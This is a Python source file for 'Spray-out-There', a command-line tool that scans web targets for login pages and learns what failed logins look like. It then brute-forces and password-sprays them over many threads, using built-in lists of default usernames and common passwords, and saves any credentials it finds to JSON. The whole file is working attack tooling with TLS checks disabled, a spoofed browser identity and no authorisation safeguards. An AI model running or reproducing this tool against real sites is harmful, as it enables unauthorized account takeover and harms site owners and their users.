#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Spray-out-There
# Version: 0.3.2

import argparse
import concurrent.futures
import json
import requests
import urllib3

from bs4 import BeautifulSoup
from enum import Enum
from os import path
from time import sleep
from urllib.parse import urlparse, urljoin
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Login(object):

    HTTP_TIMEOUT = 15
    HTTP_UA = { 'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0" }
    LOGIN_PAGES = ['login','signin','admin','panel','index.php']

    class AuthType(str, Enum):
        BASIC_AUTH = 'BASIC AUTH'
        FORM_POST = 'FORM POST'
        FORM_GET = 'FORM GET'

    def __init__(self, url: str):
        self.url = url.strip()
        if not (self.url and self.url.startswith('http')):
            raise ValueError('Invalid url')

        self.login_found = False
        self.login_url = None
        self.login_type = None
        self.iuser = None
        self.ipass = None
        self.others = {}

    @staticmethod
    def TryLoginType(url: str) -> bool:
        try:
            r = requests.get(url, timeout=Login.HTTP_TIMEOUT, verify=False, headers=Login.HTTP_UA)
        except:
            return False

        if r.status_code == 401 and 'WWW-Authenticate' in r.headers and 'Basic' in r.headers['WWW-Authenticate']:
            return LoginBA(url)
        if r.status_code == 200 and 'Content-Type' in r.headers and 'text/html' in r.headers['Content-Type']:
            login = LoginForm(url, False)
            login.findLogin(r)
            return login if login.login_found else False

        return False

    @staticmethod
    def LoadUrlsFile(file: str, filter=True) -> list:
        with open(file, 'r') as f:
            lines = f.read().splitlines()

        urls = list(set([x.strip() for x in lines if x.strip().startswith('http')]))
        if not filter:
            return urls

        filtered_urls = []
        for u in urls:
            path = urlparse(u).path
            resource = path.strip('/').split('/')[-1].lower()
            if any([resource.startswith(x) for x in Login.LOGIN_PAGES]):
                filtered_urls.append(u.strip())

        return filtered_urls


class LoginBA(Login):

    def __init__(self, url: str):
        super().__init__(url)
        self.login_url = self.url
        self.login_type = Login.AuthType.BASIC_AUTH
        self.login_found = True

    def __eq__(self, value):
        return self.url == value.url

    def FindBadLogin(self) -> list:
        self.bad_logins = [{
            'by':'status_code',
            'value': 401
            }]

        return self.bad_logins


class LoginForm(Login):

    USER_FIELDS = ['user','mail','login','usuario']
    LOGIN_FAIL = ['invalid login','authentication failed','password incorrect','error!','incorrect','invalid','failed']

    def __init__(self, url: str, auto=True):
        super().__init__(url)
        self.login_type = Login.AuthType.FORM_POST
        if auto:
            self.__tryLoginForm()

    def __eq__(self, value):
        return (
            self.login_url == value.login_url and
            self.iuser == value.iuser and
            self.ipass == value.ipass
        )

    def __tryLoginForm(self):
        try:
            r = requests.get(self.url, timeout=Login.HTTP_TIMEOUT, verify=False, headers=Login.HTTP_UA)
        except:
            return False
        if r.status_code != 200 or 'text/html' not in r.headers['Content-Type']:
            return False
        self.__findLogin(r)

    def findLogin(self, response) -> None:
        soup = BeautifulSoup(response.text, 'html.parser')

        for form in soup.find_all('form'):
            inputs = form.find_all('input')
            buttons = form.find_all('button')
            self.login_url = urljoin(self.url, form.get('action'))

            method = form.get('method')
            if method and method.lower() == 'get':
                self.login_type = Login.AuthType.FORM_GET
            else:
                self.login_type = Login.AuthType.FORM_POST

            user_fields = [x.get('name') for x in inputs if x.get('name') and (not x.get('type') or (x.get('type') == 'email' or x.get('type') == 'text'))]
            if len(user_fields) == 1:
                user_field = user_fields[0]
            elif len(user_fields) > 1:
                possibles = [x for x in user_fields if any(u in x.lower() for u in LoginForm.USER_FIELDS)]
                if possibles:
                    user_field = possibles[0]
                else:
                    user_field = user_fields[0]
            else:
                # TODO Logins with password only
                return

            pass_fields = [x.get('name') for x in inputs if x.get('type') == 'password']

            other_fields =  {
                **dict((x.get('name'), x.get('value')) for x in inputs if x.get('name')),
                **dict((x.get('name'), x.get('value')) for x in buttons if x.get('name'))
                }
            for k,v in other_fields.items():
                if not v:
                    other_fields[k] = ''

            if len(pass_fields) == 1:
                self.ipass = pass_fields[0]
                del other_fields[pass_fields[0]]
                if user_field:
                    self.iuser = user_field
                    del other_fields[user_field]

                self.login_found = True
                self.others = other_fields
                break

    def FindBadLogin(self) -> list:
        self.bad_logins = []
        headers = {
            'Referer': self.url,
            **Login.HTTP_UA
        }
        payload = {
            self.iuser: 'foo@n0n3.net',
            self.ipass: 'notavalidpass',
            **self.others
        }

        r_get = requests.get(self.login_url, timeout=Login.HTTP_TIMEOUT, verify=False, headers=headers)
        r_post = requests.post(self.login_url, timeout=Login.HTTP_TIMEOUT, verify=False, headers=headers, data=payload)
        content = r_get.text.lower()
        content_bad = r_post.text.lower()

        if r_get.status_code == 200 and r_post.status_code in [401, 402, 403]:
            self.bad_logins.append(
                {
                    'by':'status_code',
                    'value': r_post.status_code
                })

        for keyword in LoginForm.LOGIN_FAIL:
            if keyword in content_bad and keyword not in content:
                self.bad_logins.append(
                    {
                        'by':'keyword',
                        'value': keyword
                    })

        if len(content) != len(content_bad) and len(content_bad) != 0:
            payload[self.iuser] = 'bar'
            r_post_2 = requests.post(self.login_url, timeout=Login.HTTP_TIMEOUT, verify=False, headers=headers, data=payload)
            if len(content_bad) == len(r_post_2.text.lower()):
                self.bad_logins.append(
                    {
                        'by':'size',
                        'value': len(content_bad)
                    })

        return self.bad_logins


class Brute(object):

    HTTP_TIMEOUT = 4
    HTTP_MAX_RETRIES = 3
    HTTP_UA = { 'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0" }

    def __init__(self, users: list, passwords: list, login):
        if not (users and passwords):
            raise ValueError('Empty user or password list')
        if not (login.login_found and login.bad_logins):
            raise ValueError('Invalid Login')

        self.user_list = users
        self.pass_list = passwords
        self.creds = None
        self.creds_verified = False
        self.verifying = False
        self.errors = 0
        self.ref_url = login.url
        self.login_url = login.login_url
        self.headers = {
            'Referer': self.ref_url,
            **Brute.HTTP_UA
        }

        self.login_type = login.login_type
        if self.login_type != Login.AuthType.BASIC_AUTH:
            self.iuser = login.iuser
            self.ipass = login.ipass
        if self.login_type == Login.AuthType.FORM_POST:
            self.others = login.others

        self.__select_best_bad(login.bad_logins)

    def __select_best_bad(self, bad_logins: list) -> None:
        self.bad_by = None
        self.bad_value = ''
        for option in bad_logins:
            if option['by'] == 'status_code':
                self.bad_by = 'status_code'
                self.bad_value = option['value']
                break
            if option['by'] == 'keyword':
                if self.bad_by == 'keyword':
                    if len(option['value']) > len(self.bad_value):
                        self.bad_value = option['value']
                else:
                    self.bad_by = 'keyword'
                    self.bad_value = option['value']
            if option['by'] == 'size':
                if not self.bad_by:
                    self.bad_by = 'size'
                    self.bad_value = option['value']

    def Start(self, threads=10):
        print(self.login_url)
        workers = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as pool:
            for password in self.pass_list:
                for username in self.user_list:
                    w = pool.submit(self.CheckCreds, username, password)
                    workers.append(w)
            for worker in concurrent.futures.as_completed(workers):
                if worker.result():
                    if self.__reverify():
                        pool.shutdown(wait=False)
                        return (self.login_url, self.creds)

        return False

    def CheckCreds(self, username: str, password: str) -> bool:
        while(self.verifying):
            sleep(Brute.HTTP_TIMEOUT/2)
        if self.errors > 8 or (self.creds and self.creds_verified):
            return False

        return self.__check_creds(username, password)

    def __reverify(self) -> bool:
        while(self.verifying):
            sleep(Brute.HTTP_TIMEOUT/2)
        if self.errors > 8 or self.creds_verified:
            return False
        self.verifying = True
        sleep(Brute.HTTP_TIMEOUT)
        if self.__check_creds('foobar', 'notavalidpass'):
            self.creds_verified = False
        else:
            self.creds_verified = self.__check_creds(self.creds[0], self.creds[1])

        if not self.creds_verified:
            self.errors += 2
            self.creds = None

        self.verifying = False
        return self.creds_verified
            

    def __check_creds(self, username: str, password: str) -> bool:
        response = self.__do_attempt(username, password)
        if not response:
            return False
        if self.bad_by == 'keyword':
            if self.__by_keyword(response):
                self.creds = (username, password)
                return True
        elif self.bad_by == 'size':
            if self.__by_size(response):
                self.creds = (username, password)
                return True
        elif self.bad_by == 'status_code':
            if self.__by_status_code(response):
                self.creds = (username, password)
                return True
        return False

    def __do_attempt(self, username: str, password: str):
        attempt = 0
        while(attempt < Brute.HTTP_MAX_RETRIES):
            try:
                if self.login_type == Login.AuthType.FORM_POST:
                    return self.__do_form_post(username, password)
                if self.login_type == Login.AuthType.BASIC_AUTH:
                    return self.__do_basic_auth(username, password)
                if self.login_type == Login.AuthType.FORM_GET:
                    return self.__do_form_get(username, password)
                else:
                    return False
            except requests.exceptions.ConnectionError:
                attempt += 2
                self.errors += 1
            except requests.exceptions.HTTPError:
                attempt += 1
                sleep(attempt)
            except requests.exceptions.Timeout:
                attempt += 1
                self.errors += 1
                sleep(attempt * 2)
            except requests.exceptions.TooManyRedirects:
                return False
            except requests.exceptions.RequestException:
                return False
        return False

    def __do_basic_auth(self, username: str, password: str):
        return requests.get(self.login_url, timeout=Brute.HTTP_TIMEOUT, verify=False, headers=self.headers,
                            auth=requests.auth.HTTPBasicAuth(username, password))

    def __do_form_post(self, username: str, password: str):
        payload = {
            self.iuser: username,
            self.ipass: password,
            **self.others
        }
        return requests.post(self.login_url, timeout=Brute.HTTP_TIMEOUT, verify=False, headers=self.headers, data=payload)

    def __do_form_get(self, username: str, password: str):
        payload = {
            self.iuser: username,
            self.ipass: password
        }
        return requests.get(self.login_url, timeout=Brute.HTTP_TIMEOUT, verify=False, headers=self.headers, params=payload)

    def __by_status_code(self, response) -> bool:
        return response.status_code != self.bad_value

    def __by_size(self, response) -> bool:
        return len(response.text) != self.bad_value

    def __by_keyword(self, response) -> bool:
        return self.bad_value not in response.text.lower()


if __name__ == "__main__":
    print('\n  --  Spray Out There  --  \n')
    parser = argparse.ArgumentParser(description='Spray Out There')
    parser.add_argument('input', type=str, nargs='+', help='file or url')
    parser.add_argument('-u', metavar='user', type=str, help='user')
    parser.add_argument('-p', metavar='pass', type=str, help='password')
    parser.add_argument('-U', metavar='file', type=str, help='user file')
    parser.add_argument('-P', metavar='file', type=str, help='password file')
    parser.add_argument('-o', metavar='name', type=str, help='output files prefix')
    parser.add_argument('--filter-urls', action='store_true', help='Filter urls for certain keywords before search for logins')
    args = parser.parse_args()

    if args.input[0].startswith('http'):
        targets = [args.input[0].strip()]
    elif path.exists(args.input[0]):
        targets = Login.LoadUrlsFile(args.input[0], args.filter_urls)
    else:
        print('> Invalid input, use url or list file')
        quit()

    if args.u:
        users = [args.u]
    elif args.U:
        with open(args.U, 'r') as file:
            users = file.read().splitlines()
    else:
        users = ['admin','root','1234','adm','administrator','demo','guest','info','test']

    if args.p:
        passwords = [args.p]
    elif args.P:
        with open(args.P, 'r') as file:
            passwords = file.read().splitlines()
    else:
        passwords = ['admin','test','123456','123456789','qwerty','password','1111111','123',
                     '12345678','abc123','1234567','password1','12345','1234567890','123123',
                     '000000','Iloveyou','1234','1q2w3e4r5t','Qwertyuiop','Monkey','Dragon']

    print('> %s targets' % len(targets))
    print('> Searching logins ...')
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as pool:
        workers = [pool.submit(Login.TryLoginType, url) for url in targets]
    concurrent.futures.wait(workers)

    logins = []
    for w in workers:
        r = w.result()
        if r and r not in logins:
            logins.append(r)

    print('> %s Logins found' % len(logins))
    print(*[l.url for l in logins], sep='\n')

    print('> Analyzing login responses ...')
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as pool:
        workers = [pool.submit(login.FindBadLogin) for login in logins]
    concurrent.futures.wait(workers)

    if args.o:
        file_logins = '{}_logins.json'.format(args.o)
        with open(file_logins, '+w') as file:
            json.dump([vars(l) for l in logins], file, sort_keys=True, indent=4)

    brutes = [Brute(users, passwords, login) for login in logins if login.bad_logins]
    print('> Bruteforcing %s logins ...' % len(brutes))
    creds = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as pool:
        workers = [pool.submit(brute.Start) for brute in brutes]
        for worker in concurrent.futures.as_completed(workers):
            result = worker.result()
            if result:
                creds.append(result)
                print(' [!] CREDS FOUND ', result)

    if args.o:
        file_credetials = '{}_credentials.json'.format(args.o)
        with open(file_credetials, '+w') as file:
            json.dump(creds, file, sort_keys=True, indent=4)
